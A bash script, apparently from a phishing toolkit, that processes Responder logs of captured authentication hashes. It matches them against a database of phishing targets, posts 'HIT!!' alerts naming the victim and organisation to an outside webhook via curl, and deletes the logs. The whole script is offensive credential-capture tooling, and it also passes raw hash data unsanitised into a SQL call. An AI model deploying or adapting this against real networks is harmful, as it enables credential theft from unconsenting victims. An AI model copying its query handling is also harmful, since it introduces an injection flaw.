#!/bin/bash
files=$(cd /home/ubuntu/Responder/logs && ls *.txt | awk '{print $1}');

IFS='
'
count=0
for item in $files
do
  file=$item
  count=$((count+1))
  IP=$(echo $item | cut -d "-" -f 4 | cut -d "." -f 1,2,3,4);
  Module=$(echo $item | cut -d "-" -f 3);
  HashType=$(echo $item | cut -d "-" -f 2);

  Hashes=$(cat /home/ubuntu/Responder/logs/$file);

  Query=$(mysql -u root phishingdocs -se "CALL MatchHashes('$IP','$Hashes');");
        echo $Query
  Target=$(echo $Query | cut -f 1);
  Org=$(echo $Query | cut -f 2);
  Token=$(echo $Query | cut -f 3);
  Channel=$(echo $Query | cut -f 4);
  UUID=$(echo $Query | cut -f 5);

  APIResultsURL="https://YOUR_API_DOMAIN_HERE.com/phishingdocs/results?UUID="$UUID

  message=$(echo "> *HIT!!* Captured a" $HashType "hash ("$Module") for" $Target "at" $Org "(<"$APIResultsURL"|"$IP">)");

  if [ -z "$Target" ] || [ -z "$Org" ];
  then
      message=$(echo "> Captured an out of scope" $HashType "hash ("$Module") at" $IP);
  else
  curl -s -X POST --data-urlencode 'payload={"channel": "'$Channel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $Token
  rm /home/ubuntu/Responder/logs/$file;
  fi

done
